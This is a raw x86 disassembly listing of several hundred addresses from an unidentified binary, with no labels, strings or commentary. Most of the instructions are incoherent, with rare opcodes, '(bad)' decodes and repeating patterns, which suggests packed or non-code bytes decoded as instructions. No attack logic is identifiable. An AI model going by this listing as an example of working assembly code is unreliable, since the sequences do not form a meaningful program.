  408e4b:	jl     0x408e9b
  408e4d:	inc    edi
  408e4e:	cwde   
  408e4f:	dec    ecx
  408e50:	push   ecx
  408e51:	sub    eax,0xd466c761
  408e56:	add    eax,0x5b4b4082
  408e5b:	scas   al,BYTE PTR es:[edi]
  408e5c:	inc    ebx
  408e5d:	add    BYTE PTR ds:0x41107840,al
  408e63:	bound  eax,QWORD PTR [eax+0x40]
  408e66:	sldt   WORD PTR [eax-0x34]
  408e6a:	js     0x408ece
  408e6c:	add    eax,0x40664143
  408e71:	inc    ebx
  408e72:	add    BYTE PTR [ecx+0x5],al
  408e75:	js     0x408eb7
  408e77:	bound  eax,QWORD PTR [eax+0x0]
  408e7a:	inc    eax
  408e7b:	shr    BYTE PTR [edx+esi*2+0x2b],cl
  408e7f:	inc    eax
  408e80:	and    ch,BYTE PTR [ecx+0x4a]
  408e83:	or     eax,0x40427ef6
  408e88:	outs   dx,BYTE PTR ds:[esi]
  408e89:	ror    BYTE PTR [edx],1
  408e8b:	pusha  
  408e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e8d:	bound  eax,QWORD PTR [eax+0x40]
  408e90:	dec    ebp
  408e91:	sub    eax,0x8852f252
  408e96:	or     al,0x40
  408e98:	stos   DWORD PTR es:[edi],eax
  408e99:	ins    DWORD PTR es:[edi],dx
  408e9a:	cwde   
  408e9b:	stc    
  408e9c:	xlat   BYTE PTR ds:[ebx]
  408e9d:	fs push 0x40
  408ea0:	inc    ebp
  408ea1:	arpl   WORD PTR [ebx-0x30],ax
  408ea4:	int    0x65
  408ea6:	sbb    al,0x40
  408ea8:	mov    ds:0x40050549,eax
  408ead:	or     eax,0x6242407c
  408eb2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  408eb4:	inc    ecx
  408eb5:	inc    ebx
  408eb6:	inc    eax
  408eb7:	inc    eax
  408eb8:	add    eax,0x434162
  408ebd:	inc    eax
  408ebe:	add    BYTE PTR [edx+0x5],ah
  408ec1:	inc    eax
  408ec2:	adc    BYTE PTR [edx+0x40],ah
  408ec5:	inc    ebx
  408ec6:	inc    ecx
  408ec7:	add    eax,0x4340
  408ecc:	add    eax,0x404162
  408ed1:	add    BYTE PTR [eax+0x43],al
  408ed4:	inc    eax
  408ed5:	add    eax,0x4063f50c
  408eda:	pusha  
  408edb:	cs sar bl,1
  408ede:	fld    DWORD PTR [bp+di+0x40]
  408ee2:	xor    edx,DWORD PTR [edx-0x19]
  408ee5:	fs jb  0x408f44
  408ee8:	mov    ds:0xaaa54240,al
  408eed:	clc    
  408eee:	test   al,0xb
  408ef0:	add    DWORD PTR [eax-0x55],0x10ce0bbd
  408ef7:	xor    DWORD PTR [eax+0x40],eax
  408efa:	sbb    eax,0xb0b6cf48
  408eff:	retf   0x40
  408f02:	add    BYTE PTR [ecx+0x43],al
  408f05:	add    eax,0x41784062
  408f0a:	inc    eax
  408f0b:	inc    eax
  408f0c:	add    BYTE PTR [edi],cl
  408f0e:	bound  eax,QWORD PTR [ebx+0x0]
  408f11:	add    eax,0x25006240
  408f16:	inc    eax
  408f17:	add    eax,0x40254143
  408f1c:	add    eax,0x41620000
  408f21:	inc    eax
  408f22:	inc    esp
  408f23:	popa   
  408f24:	pop    ss
  408f25:	fiadd  DWORD PTR ds:0xe0406ed3
  408f2b:	inc    ebp
  408f2c:	cs data16 int 0xd8
  408f30:	and    BYTE PTR [eax+0x27],al
  408f33:	mov    ds:0xc212ccc9,eax
  408f38:	bound  eax,QWORD PTR [eax+0x42]
  408f3b:	push   esi
  408f3c:	jmp    0x52254792
  408f41:	inc    eax
  408f42:	and    DWORD PTR [ebx+0x49],esp
  408f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f46:	adc    eax,0x4344b8
  408f4b:	add    BYTE PTR [eax],al
  408f4d:	inc    ecx
  408f4e:	inc    eax
  408f4f:	bound  esp,QWORD PTR [esi+0x0]
  408f52:	inc    eax
  408f53:	add    eax,0x5400000
  408f58:	inc    ecx
  408f59:	inc    eax
  408f5a:	inc    eax
  408f5b:	bound  esp,QWORD PTR ds:0x25050043
  408f61:	inc    ecx
  408f62:	inc    ebx
  408f63:	inc    eax
  408f64:	test   BYTE PTR [eax+0x0],al
  408f67:	bound  ebx,QWORD PTR [eax+0x62]
  408f6a:	inc    ecx
  408f6b:	inc    eax
  408f6c:	inc    eax
  408f6d:	inc    edx
  408f6e:	enter  0xca11,0xcd
  408f72:	arpl   WORD PTR [edi],ax
  408f74:	inc    eax
  408f75:	loopne 0x408f98
  408f77:	rcl    DWORD PTR [ecx+0x59],1
  408f7a:	lods   al,BYTE PTR ds:[esi]
  408f7b:	repnz inc eax
  408f7d:	xor    al,0x56
  408f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f81:	xor    eax,0xea406236
  408f86:	and    DWORD PTR [esi],eax
  408f88:	enter  0x5549,0xcb
  408f8c:	je     0x408fb0
  408f8e:	jno    0x408fb6
  408f90:	push   ecx
  408f91:	js     0x408ff5
  408f93:	cdq    
  408f94:	pop    ss
  408f95:	sub    ah,BYTE PTR [ecx]
  408f97:	xchg   esp,eax
  408f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f99:	nop
  408f9a:	or     eax,0x654074a5
  408f9f:	sub    al,0xc6
  408fa1:	mov    ebx,0xf40c63b4
  408fa6:	and    ebx,ebp
  408fa8:	adc    BYTE PTR [edx+0x40],ah
  408fab:	inc    ecx
  408fac:	and    eax,0x40000500
  408fb1:	inc    ebx
  408fb2:	add    eax,0x40624041
  408fb7:	inc    ebx
  408fb8:	add    eax,0x43402541
  408fbd:	bound  eax,QWORD PTR [eax+0x43]
  408fc0:	int3   
  408fc1:	inc    eax
  408fc2:	bound  eax,QWORD PTR [eax]
  408fc4:	inc    ecx
  408fc5:	inc    eax
  408fc6:	inc    eax
  408fc7:	add    eax,0x25064a05
  408fcc:	inc    edi
  408fcd:	je     0x408ffe
  408fcf:	icebp  
  408fd0:	lods   eax,DWORD PTR ss:[esi]
  408fd2:	test   al,0x1a
  408fd4:	or     BYTE PTR [edx-0x1a],bh
  408fd7:	loope  0x40903b
  408fd9:	les    edx,FWORD PTR [ecx]
  408fdb:	jl     0x408fb6
  408fdd:	je     0x409001
  408fdf:	mov    edi,0x63a451c9
  408fe4:	outs   dx,DWORD PTR fs:[esi]
  408fe6:	xor    ah,BYTE PTR [edx+0x51]
  408fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fea:	inc    edx
  408feb:	ins    DWORD PTR es:[edi],dx
  408fec:	mov    esi,0x62e5d774
  408ff1:	inc    eax
  408ff2:	and    eax,0x5406600
  408ff7:	inc    ebx
  408ff8:	inc    ecx
  408ff9:	inc    eax
  408ffa:	inc    eax
  408ffb:	inc    ebx
  408ffc:	add    BYTE PTR [eax],al
  408ffe:	add    BYTE PTR [edx-0x34],ah
  409001:	inc    eax
  409002:	add    eax,0x40004041
  409007:	inc    ecx
  409008:	int3   
  409009:	add    BYTE PTR [ebx-0x7c],al
  40900c:	add    eax,0x5406240
  409011:	bound  esi,QWORD PTR [ecx+0x24a8e8c2]
  409017:	imul   esp,DWORD PTR [edx-0x4],0x10c4514c
  40901e:	xlat   BYTE PTR ds:[ebx]
  40901f:	je     0x40908f
  409021:	mov    ds:0xac55a5be,eax
  409026:	outs   dx,BYTE PTR ds:[esi]
  409027:	dec    edi
  409028:	inc    eax
  409029:	int    0xab
  40902b:	sar    BYTE PTR [eax+0x61734141],0x63
  409032:	mov    esi,0x6360b651
  409037:	rol    BYTE PTR [ebp+0x65],cl
  40903a:	inc    eax
  40903b:	bound  ebx,QWORD PTR [eax+0x41]
  40903e:	add    eax,0x40404340
  409043:	inc    ebx
  409044:	inc    eax
  409045:	test   BYTE PTR [eax],al
  409047:	add    eax,0x40624041
  40904c:	inc    eax
  40904d:	add    BYTE PTR [edx+0x5],ah
  409050:	inc    ebx
  409051:	add    BYTE PTR [eax+0x78],al
  409054:	inc    ecx
  409055:	add    BYTE PTR [eax+0x41],bl
  409058:	bound  esi,QWORD PTR [ecx-0x5b]
  40905b:	push   esi
  40905c:	js     0x4090ac
  40905e:	jae    0x409080
  409060:	fld    QWORD PTR gs:[esi-0x38cf9d2f]
  409067:	outs   dx,DWORD PTR ds:[esi]
  409068:	inc    ecx
  409069:	cmp    al,0xfc
  40906b:	mov    ah,0x15
  40906d:	shl    DWORD PTR [ebx+0x16],0x22
  409071:	sub    BYTE PTR [edx+0xd],ah
  409074:	inc    eax
  409075:	test   BYTE PTR [eax],al
  409077:	int3   
  409078:	bound  eax,QWORD PTR ds:0xcc840f41
  40907e:	inc    ebx
  40907f:	add    BYTE PTR [eax+0x0],al
  409082:	inc    eax
  409083:	inc    eax
  409084:	inc    eax
  409085:	int3   
  409086:	add    BYTE PTR ds:0x62404341,al
  40908c:	pop    eax
  40908d:	add    BYTE PTR [ebx+0x40],al
  409090:	bound  ecx,QWORD PTR [edi]
  409092:	inc    eax
  409093:	imul   edx,DWORD PTR [ebp+0x5d],0x7e
  409097:	sub    eax,0xc744c5d2
  40909c:	xor    DWORD PTR [edx+0x20],esi
  40909f:	leave  
  4090a0:	pop    edi
  4090a1:	push   eax
  4090a2:	loop   0x40910a
  4090a4:	add    bh,dh
  4090a6:	jp     0x409049
  4090a8:	retf   0xf999
  4090ab:	bound  esp,QWORD PTR [ebx+0x72]
  4090ae:	push   ecx
  4090af:	xor    al,0xd0
  4090b1:	ret    
  4090b2:	mov    dl,0xb0
  4090b4:	pusha  
  4090b5:	and    eax,0x34ebe1a0
  4090ba:	add    eax,0x3472c80d
  4090bf:	mov    ebx,0xcb44d5e9
  4090c4:	arpl   WORD PTR [eax],ax
  4090c6:	add    BYTE PTR [eax+0x40],al
  4090c9:	cmovno eax,DWORD PTR ds:0x40056243
  4090d0:	int3   
  4090d1:	add    ah,cl
  4090d3:	inc    eax
  4090d4:	inc    eax
  4090d5:	bound  eax,QWORD PTR [ecx+0x0]
  4090d8:	add    BYTE PTR [edi],cl
  4090da:	inc    ebx
  4090db:	inc    eax
  4090dc:	inc    eax
  4090dd:	add    BYTE PTR [ecx+0x43],al
  4090e0:	add    eax,0x40256240
  4090e5:	bound  eax,QWORD PTR [eax]
  4090e7:	jo     0x409131
  4090e9:	pop    ebp
  4090ea:	scas   eax,DWORD PTR es:[edi]
  4090eb:	push   eax
  4090ec:	jecxz  0x4090fe
  4090ee:	cmp    DWORD PTR [edx+0x20],esi
  4090f1:	mov    ds:0xa4f8ed4c,eax
  4090f6:	fsub   QWORD PTR [eax+0x28]
  4090f9:	inc    ecx
  4090fa:	popa   
  4090fb:	cli    
  4090fc:	add    eax,0x4140cc00
  409101:	inc    eax
  409102:	inc    ebx
  409103:	bound  esp,QWORD PTR ds:0x41400043
  409109:	add    BYTE PTR [eax],al
  40910b:	add    eax,0x43624062
  409110:	inc    ecx
  409111:	inc    eax
  409112:	inc    eax
  409113:	inc    eax
  409114:	add    eax,0x40624340
  409119:	add    eax,0x40664140
  40911e:	mov    al,0x5
  409120:	cmc    
  409121:	jb     0x409130
  409123:	arpl   sp,dx
  409125:	cld    
  409126:	adc    eax,0xad42a943
  40912b:	je     0x409105
  40912d:	into   
  40912e:	inc    ebp
  40912f:	inc    esp
  409130:	mov    eax,0x4ba54d71
  409135:	(bad)  
  409136:	out    0x19,eax
  409138:	cmp    DWORD PTR [ecx+eiz*2-0x505aebd],ebp
  40913f:	add    BYTE PTR [edi+0x42e8eb40],bh
  409145:	push   eax
  409146:	lods   al,BYTE PTR ds:[esi]
  409147:	bound  ebp,QWORD PTR [eax+eax*2+0x68]
  40914b:	xor    ah,ch
  40914d:	lods   eax,DWORD PTR ds:[esi]
  40914e:	jae    0x409184
  409150:	and    BYTE PTR [eax+0x21],al
  409153:	es jp  0x409199
  409156:	add    BYTE PTR ds:0x41107840,al
  40915c:	bound  eax,QWORD PTR [eax+0x40]
  40915f:	sldt   WORD PTR [eax-0x34]
  409163:	js     0x4091c7
  409165:	add    eax,0x40664143
  40916a:	inc    ebx
  40916b:	add    BYTE PTR [ecx+0x5],al
  40916e:	js     0x4091b0
  409170:	bound  eax,QWORD PTR [eax+0x0]
  409173:	inc    eax
  409174:	clc    
  409175:	rol    BYTE PTR [eax+0x60],cl
  409178:	push   0x53a7e14f
  40917d:	stos   BYTE PTR es:[edi],al
  40917e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40917f:	and    al,0x40
  409181:	mov    eax,ds:0x5f93048
  409186:	cmp    eax,0x61ed4162
  40918b:	xchg   BYTE PTR [esi],cl
  40918d:	inc    ecx
  40918e:	ret    
  40918f:	lds    eax,FWORD PTR [eax]
  409191:	and    BYTE PTR [edi],ch
  409193:	mov    edx,edi
  409195:	ret    0x4164
  409198:	inc    ebx
  409199:	inc    eax
  40919a:	inc    eax
  40919b:	add    eax,0x434162
  4091a0:	inc    eax
  4091a1:	add    BYTE PTR [edx+0x5],ah
  4091a4:	inc    eax
  4091a5:	adc    BYTE PTR [edx+0x40],ah
  4091a8:	inc    ebx
  4091a9:	inc    ecx
  4091aa:	add    eax,0x4340
  4091af:	add    eax,0x404162
  4091b4:	add    BYTE PTR [eax+0x43],al
  4091b7:	inc    eax
  4091b8:	add    eax,0x232f40dc
  4091bd:	(bad)  
  4091be:	not    BYTE PTR [eax]
  4091c0:	xor    al,0x32
  4091c2:	inc    eax
  4091c3:	jne    0x40917c
  4091c5:	sub    eax,0x8c44f846
  4091ca:	inc    eax
  4091cb:	loop   0x409216
  4091cd:	shl    BYTE PTR [edi+0x7c7045a8],0x6d
  4091d4:	and    DWORD PTR [ecx-0xc],edi
  4091d7:	adc    eax,0x6648874c
  4091dc:	inc    edi
  4091dd:	jae    0x4091e4
  4091df:	inc    ecx
  4091e0:	push   edx
  4091e1:	fs jnp 0x409224
  4091e4:	add    BYTE PTR [eax],al
  4091e6:	inc    ecx
  4091e7:	inc    ebx
  4091e8:	add    eax,0x41784062
  4091ed:	inc    eax
  4091ee:	inc    eax
  4091ef:	add    BYTE PTR [edi],cl
  4091f1:	bound  eax,QWORD PTR [ebx+0x0]
  4091f4:	add    eax,0x25006240
  4091f9:	inc    eax
  4091fa:	add    eax,0x40254143
  4091ff:	add    eax,0x22620000
  409204:	popa   
  409205:	add    eax,0x2a041a1
  40920a:	mov    dl,0x14
  40920c:	push   esi
  40920d:	mov    edi,0xc915c092
  409212:	jnp    0x4091be
  409214:	mov    ds:0xc90d64f1,eax
  409219:	inc    ecx
  40921a:	or     eax,0xf8423940
  40921f:	cli    
  409220:	cmp    al,0x49
  409222:	jp     0x409204
  409224:	loope  0x4092a0
  409226:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409228:	inc    ecx
  409229:	les    esi,FWORD PTR [esp+ebp*1]
  40922c:	and    al,0x53
  40922e:	adc    eax,0x7a42140d
  409233:	dec    ebp
  409234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409235:	adc    DWORD PTR [eax+0x43],esp
  40923b:	inc    ecx
  40923c:	inc    eax
  40923d:	bound  esp,QWORD PTR [esi+0x0]
  409240:	inc    eax
  409241:	add    eax,0x5400000
  409246:	inc    ecx
  409247:	inc    eax
  409248:	inc    eax
  409249:	bound  esp,QWORD PTR ds:0x25050043
  40924f:	inc    ecx
  409250:	inc    ebx
  409251:	inc    eax
  409252:	test   BYTE PTR [eax+0x0],al
  409255:	bound  ebx,QWORD PTR [eax+0x62]
  409258:	inc    ecx
  409259:	inc    eax
  40925a:	inc    ecx
  40925b:	inc    ebx
  40925c:	loopne 0x409285
  40925e:	in     eax,0xd
  409260:	arpl   WORD PTR [edi+0x7a703041],bp
  409266:	shl    BYTE PTR [edx+0x78c064d9],0xef
  40926d:	push   edi
  40926e:	in     eax,0x2a
  409270:	push   esi
  409271:	cli    
  409272:	add    eax,0x6b7aa862
  409277:	sbb    DWORD PTR [esi-0x10],0x476045f9
  40927e:	and    ecx,esp
  409280:	jne    0x40928f
  409282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409283:	add    BYTE PTR [ecx],0x79
  409286:	push   esi
  409287:	mov    ebp,0x62104f5c
  40928c:	inc    eax
  40928d:	inc    ecx
  40928e:	and    eax,0x40000500
  409293:	inc    ebx
  409294:	add    eax,0x40624041
  409299:	inc    ebx
  40929a:	add    eax,0x43402541
  40929f:	bound  eax,QWORD PTR [eax+0x43]
  4092a2:	int3   
  4092a3:	inc    eax
  4092a4:	bound  eax,QWORD PTR [eax]
  4092a6:	inc    ecx
  4092a7:	inc    eax
  4092a8:	inc    eax
  4092a9:	add    eax,0xc92b0505
  4092ae:	out    dx,eax
  4092af:	mov    ds:0x41eb7254,eax
  4092b4:	jb     0x4092f9
  4092b6:	jns    0x409304
  4092b8:	loope  0x409298
  4092ba:	stc    
  4092bb:	dec    edi
  4092bc:	test   DWORD PTR [edx-0x1c],0xeea50ce3
  4092c3:	rcl    BYTE PTR [ebx-0x34],0x79
  4092c7:	inc    eax
  4092c8:	loope  0x40932c
  4092ca:	inc    eax
  4092cb:	and    eax,0x5406600
  4092d0:	inc    ebx
  4092d1:	inc    ecx
  4092d2:	inc    eax
  4092d3:	inc    eax
  4092d4:	inc    ebx
  4092d5:	add    BYTE PTR [eax],al
  4092d7:	add    BYTE PTR [edx-0x34],ah
  4092da:	inc    eax
  4092db:	add    eax,0x40004041
  4092e0:	inc    ecx
  4092e1:	int3   
  4092e2:	add    BYTE PTR [ebx-0x7c],al
  4092e5:	add    eax,0x5406240
  4092ea:	bound  edx,QWORD PTR [ebp+eax*1-0x28ed5bec]
  4092f1:	mov    ds:0xf84fa028,eax
  4092f6:	mov    ebx,0x20ff79dc
  4092fb:	mov    esi,0x62ad40eb
  409300:	int3   
  409301:	push   ebx
  409302:	xor    bh,dl
  409304:	inc    eax
  409305:	bound  ebx,QWORD PTR [eax+0x41]
  409308:	add    eax,0x40404340
  40930d:	inc    ebx
  40930e:	inc    eax
  40930f:	test   BYTE PTR [eax],al
  409311:	add    eax,0x40624041
  409316:	inc    eax
  409317:	add    BYTE PTR [edx+0x5],ah
  40931a:	inc    ebx
  40931b:	add    BYTE PTR [eax+0x78],al
  40931e:	inc    ecx
  40931f:	add    BYTE PTR [eax+0x41],bl
  409322:	(bad)  
  409323:	clc    
  409324:	inc    eax
  409325:	push   ebx
  409326:	inc    eax
  409327:	jns    0x40930a
  409329:	and    al,0xe0
  40932b:	in     al,dx
  40932c:	inc    eax
  40932d:	retf   
  40932e:	inc    eax
  40932f:	rol    ebp,0x21
  409332:	jno    0x409349
  409334:	shl    DWORD PTR [eax+0x34e279d8],1
  40933a:	mov    ds:0x3024a94f,eax
  40933f:	xor    al,0x13
  409341:	popa   
  409342:	mov    edi,0xa82ebceb
  409347:	jns    0x40937a
  409349:	sub    BYTE PTR [edx],ah
  40934b:	cli    
  40934c:	add    eax,0xe12a5c67
  409351:	and    DWORD PTR [ebp-0x16],esp
  409354:	retf   
  409355:	dec    edx
  409356:	add    bh,BYTE PTR [ecx+0x32]
  409359:	inc    esp
  40935a:	dec    edx
  40935b:	or     eax,0x8440c848
  409360:	add    ah,cl
  409362:	bound  eax,QWORD PTR ds:0xcc840f41
  409368:	inc    ebx
  409369:	add    BYTE PTR [eax+0x0],al
  40936c:	inc    eax
  40936d:	inc    eax
  40936e:	inc    eax
  40936f:	int3   
  409370:	add    BYTE PTR ds:0x62404341,al
  409376:	pop    eax
  409377:	add    BYTE PTR [ebx+0x40],al
  40937a:	bound  ecx,QWORD PTR [edi]
  40937c:	inc    eax
  40937d:	leave  
  40937e:	pop    ds
  40937f:	aaa    
  409380:	and    BYTE PTR [eax+0x4552484f],ch
  409386:	jns    0x4093e3
  409388:	scas   eax,DWORD PTR es:[edi]
  409389:	add    bl,ch
  40938b:	inc    edi
  40938c:	mov    bh,0x44
  40938e:	adc    ah,BYTE PTR [eax+0x6c]
  409391:	mov    bl,0xf9
  409393:	jl     0x40935a
  409395:	cld    
  409396:	jns    0x4093c1
  409398:	add    BYTE PTR [eax],al
  40939a:	inc    eax
  40939b:	inc    eax
  40939c:	cmovno eax,DWORD PTR ds:0x40056243
  4093a3:	int3   
  4093a4:	add    ah,cl
  4093a6:	inc    eax
  4093a7:	inc    eax
  4093a8:	bound  eax,QWORD PTR [ecx+0x0]
  4093ab:	add    BYTE PTR [edi],cl
  4093ad:	inc    ebx
  4093ae:	inc    eax
  4093af:	inc    eax
  4093b0:	add    BYTE PTR [ecx+0x43],al
  4093b3:	add    eax,0x40256240
  4093b8:	bound  eax,QWORD PTR [eax]
  4093ba:	inc    eax
  4093bb:	xchg   esi,eax
  4093bc:	call   0x780e32c
  4093c1:	gs and eax,0x6852059c
  4093c7:	inc    eax
  4093c8:	jns    0x40942d
  4093ca:	dec    esp
  4093cb:	xchg   esp,eax
  4093cc:	dec    edi
  4093cd:	jl     0x409406
  4093cf:	xlat   BYTE PTR ds:[ebx]
  4093d0:	jl     0x40936f
  4093d2:	jecxz  0x4093f7
  4093d4:	jmp    0x409445
  4093d6:	dec    esp
  4093d7:	ds jns 0x4093ab
  4093da:	jns    0x4093ac
  4093dc:	clc    
  4093dd:	jp     0x4093df
  4093df:	test   al,0x6f
  4093e1:	jecxz  0x409404
  4093e3:	dec    edi
  4093e4:	out    0xe8,al
  4093e6:	inc    esp
  4093e7:	ja     0x409462
  4093e9:	pop    edi
  4093ea:	add    eax,0x36b446dd
  4093ef:	inc    ebx
  4093f0:	and    al,BYTE PTR fs:0x4140cc00
  4093f7:	inc    eax
  4093f8:	inc    ebx
  4093f9:	bound  esp,QWORD PTR ds:0x41400043
  4093ff:	add    BYTE PTR [eax],al
  409401:	add    eax,0x43624062
  409406:	inc    ecx
  409407:	inc    eax
  409408:	inc    eax
  409409:	inc    eax
  40940a:	add    eax,0x40624340
  40940f:	add    eax,0x40664140
  409414:	loop   0x40944a
  409416:	stos   BYTE PTR es:[edi],al
  409417:	ss inc ebp
  409419:	pop    esi
  40941a:	jns    0x409441
  40941c:	and    DWORD PTR [edx+0x2ca891e4],ebp
  409422:	pop    ecx
  409423:	ret    0xab24
  409426:	dec    ecx
  409427:	dec    eax
  409428:	ja     0x40946e
  40942a:	jns    0x409493
  40942c:	mov    ds:0xaa15b590,al
  409431:	cmp    al,0x49
  409433:	(bad)  
  409434:	pop    ebp
  409435:	scas   eax,DWORD PTR es:[edi]
  409436:	loop   0x40947b
  409438:	add    BYTE PTR ds:0x41107840,al
  40943e:	bound  eax,QWORD PTR [eax+0x40]
  409441:	sldt   WORD PTR [eax-0x34]
  409445:	js     0x4094a9
  409447:	add    eax,0x40664143
  40944c:	inc    ebx
  40944d:	add    BYTE PTR [ecx+0x5],al
  409450:	js     0x409492
  409452:	bound  eax,QWORD PTR [eax+0x0]
  409455:	inc    eax
  409456:	retf   
  409457:	and    edi,DWORD PTR fs:[eax+0x65]
  40945b:	ss lock add eax,0xbf0a7f37
  409462:	aas    
  409463:	adc    ecx,DWORD PTR [edx+0x778c3a1]
  409469:	js     0x409450
  40946b:	mov    eax,ds:0x62643e5f
  409470:	cs mov al,0x44
  409473:	inc    ebx
  409474:	mov    eax,0x6310c865
  409479:	js     0x4094dc
  40947b:	loopne 0x409407
  40947d:	loopne 0x40944a
  40947f:	mov    ah,0x10
  409481:	pushf  
  409482:	dec    esp
  409483:	sub    DWORD PTR [esi+0x15],ebp
  409486:	mov    edi,0x22404c05
  40948b:	cmp    eax,0x43414f12
  409490:	inc    eax
  409491:	inc    eax
  409492:	add    eax,0x434162
  409497:	inc    eax
  409498:	add    BYTE PTR [edx+0x5],ah
  40949b:	inc    eax
  40949c:	adc    BYTE PTR [edx+0x40],ah
  40949f:	inc    ebx
  4094a0:	inc    ecx
  4094a1:	add    eax,0x4340
  4094a6:	add    eax,0x404162
  4094ab:	add    BYTE PTR [eax+0x43],al
  4094ae:	inc    eax
  4094af:	add    eax,0x4047cdbf
  4094b4:	lahf   
  4094b5:	and    eax,0x4107eafb
  4094ba:	xchg   BYTE PTR [eax+0x34],al
  4094bd:	jl     0x40946c
  4094bf:	mov    eax,DWORD PTR [ebp-0x2c83ed1d]
  4094c5:	popa   
  4094c6:	jmp    0x512d3d6f
  4094cb:	inc    eax
  4094cc:	mov    ds:0x45664b5d,al
  4094d1:	add    BYTE PTR gs:[ecx+0x2f],0xa0
  4094d6:	xchg   esp,eax
  4094d7:	dec    ebp
  4094d8:	rol    DWORD PTR [eax+0x0],1
  4094db:	add    BYTE PTR [ecx+0x43],al
  4094de:	add    eax,0x41784062
  4094e3:	inc    eax
  4094e4:	inc    eax
  4094e5:	add    BYTE PTR [edi],cl
  4094e7:	bound  eax,QWORD PTR [ebx+0x0]
  4094ea:	add    eax,0x25006240
  4094ef:	inc    eax
  4094f0:	add    eax,0x40254143
  4094f5:	add    eax,0x9c620000
  4094fa:	ret    
  4094fb:	jo     0x4094c5
  4094fd:	sub    eax,0x2038ac20
  409502:	inc    ecx
  409503:	inc    eax
  409504:	and    ch,BYTE PTR [esi]
  409506:	pop    ebx
  409507:	xchg   esi,eax
  409508:	into   
  409509:	lahf   
  40950a:	inc    ebx
  40950b:	inc    eax
  40950c:	ins    BYTE PTR es:[edi],dx
  40950d:	dec    edi
  40950e:	mov    BYTE PTR ds:0x4028c03c,dl
  409514:	inc    edi
  409515:	loope  0x4094fa
  409517:	dec    eax
  409518:	fs jo  0x409570
  40951b:	jbe    0x4094ff
  40951d:	inc    ebx
  40951e:	add    BYTE PTR [eax],al
  409520:	add    BYTE PTR [ecx+0x40],al
  409523:	bound  esp,QWORD PTR [esi+0x0]
  409526:	inc    eax
  409527:	add    eax,0x5400000
  40952c:	inc    ecx
  40952d:	inc    eax
  40952e:	inc    eax
  40952f:	bound  esp,QWORD PTR ds:0x25050043
  409535:	inc    ecx
  409536:	inc    ebx
  409537:	inc    eax
  409538:	test   BYTE PTR [eax+0x0],al
  40953b:	bound  ebx,QWORD PTR [eax+0x62]
  40953e:	inc    ecx
  40953f:	inc    eax
  409540:	cmp    eax,0x10c7fe27
  409545:	retf   
  409546:	inc    edi
  409547:	sub    ebp,esp
  409549:	imul   edi,edx,0x25
  40954c:	push   edx
  40954d:	push   esp
  40954e:	jne    0x4095a4
  409550:	cmp    eax,0x2e1c941e
  409555:	add    DWORD PTR [edx+0xd73ffe0],esi
  40955b:	shr    BYTE PTR [ebx-0x37],1
  40955e:	je     0x409575
  409560:	inc    ecx
  409561:	cwde   
  409562:	mov    al,ds:0xa4422229
  409567:	sub    ebx,esp
  409569:	jbe    0x409552
  40956b:	adc    DWORD PTR [ecx+0x42],0x8f255b40
  409572:	fldenv gs:[ebx+0x10]
  409576:	bound  eax,QWORD PTR [eax+0x41]
  409579:	and    eax,0x40000500
  40957e:	inc    ebx
  40957f:	add    eax,0x40624041
  409584:	inc    ebx
  409585:	add    eax,0x43402541
  40958a:	bound  eax,QWORD PTR [eax+0x43]
  40958d:	int3   
  40958e:	inc    eax
  40958f:	bound  eax,QWORD PTR [eax]
  409591:	inc    ecx
  409592:	inc    eax
  409593:	inc    eax
  409594:	add    eax,0xe140e405
  409599:	loope  0x40959e
  40959b:	xchg   edx,eax
  40959c:	enter  0x423f,0x40
  4095a0:	dec    eax
  4095a1:	push   eax
  4095a2:	repnz add eax,0x50d4cc80
  4095a8:	loopne 0x40960b
  4095aa:	and    BYTE PTR [eax+0x4020b4bc],0x23
  4095b1:	and    eax,0x15056200
  4095b6:	loop   0x40961a
  4095b8:	inc    eax
  4095b9:	and    eax,0x5406600
  4095be:	inc    ebx
  4095bf:	inc    ecx
  4095c0:	inc    eax
  4095c1:	inc    eax
  4095c2:	inc    ebx
  4095c3:	add    BYTE PTR [eax],al
  4095c5:	add    BYTE PTR [edx-0x34],ah
  4095c8:	inc    eax
  4095c9:	add    eax,0x40004041
  4095ce:	inc    ecx
  4095cf:	int3   
  4095d0:	add    BYTE PTR [ebx-0x7c],al
  4095d3:	add    eax,0x5406240
  4095d8:	bound  eax,QWORD PTR [ecx+0x48]
  4095db:	mov    ds:0x1fc9658e,eax
  4095e0:	test   al,0x60
  4095e2:	loopne 0x409651
  4095e4:	cli    
  4095e5:	nop
  4095e6:	mov    WORD PTR [edx],fs
  4095e8:	adc    al,BYTE PTR [eax+0x21]
  4095eb:	and    ecx,DWORD PTR [edi+0x58530543]
  4095f1:	jle    0x40962a
  4095f3:	mov    edi,0xc4cde9f5
  4095f8:	adc    DWORD PTR [edx+ebp*2],esi
  4095fb:	and    eax,0x4f9e1f1e
  409600:	retf   
  409601:	jle    0x409631
  409603:	popa   
  409604:	inc    ebp
  409605:	cli    
  409606:	adc    eax,0x62404440
  40960b:	pop    eax
  40960c:	inc    ecx
  40960d:	add    eax,0x40404340
  409612:	inc    ebx
  409613:	inc    eax
  409614:	test   BYTE PTR [eax],al
  409616:	add    eax,0x40624041
  40961b:	inc    eax
  40961c:	add    BYTE PTR [edx+0x5],ah
  40961f:	inc    ebx
  409620:	add    BYTE PTR [eax+0x78],al
  409623:	inc    ecx
  409624:	add    BYTE PTR [eax+0x41],bl
  409627:	bound  ebx,QWORD PTR [ebx]
  409629:	sub    dh,BYTE PTR [ecx]
  40962b:	xchg   edx,eax
  40962c:	mov    cs,ecx
  40962e:	sub    ecx,DWORD PTR [ebp+0x7d]
  409631:	sub    esp,DWORD PTR [ebx+0x23260d64]
  409637:	xor    bl,bh
  409639:	mov    eax,ds:0x9241f643
  40963e:	bound  ecx,QWORD PTR [ebp+0x7d]
  409641:	mov    eax,cs:0x5734567
  409647:	retf   
  409648:	repnz ss dec esi
  40964b:	mov    eax,esi
  40964d:	pushf  
